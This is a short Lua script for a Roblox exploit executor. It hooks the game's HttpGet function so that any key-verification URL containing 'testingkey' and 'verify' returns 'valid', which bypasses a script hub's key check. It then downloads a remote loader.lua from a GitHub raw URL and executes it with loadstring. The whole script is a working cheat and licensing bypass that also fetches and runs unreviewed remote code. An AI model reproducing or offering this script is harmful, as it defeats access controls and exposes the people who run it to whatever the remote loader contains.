local old
old = hookfunction(game.HttpGet, function(...)
   local args = {...}
   local url = args[2]
   if url:match('testingkey') and url:match('verify') then
       return 'valid'
   end
   return old(...)
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/lxnnydev/Delta-PSX/main/loader.lua"))()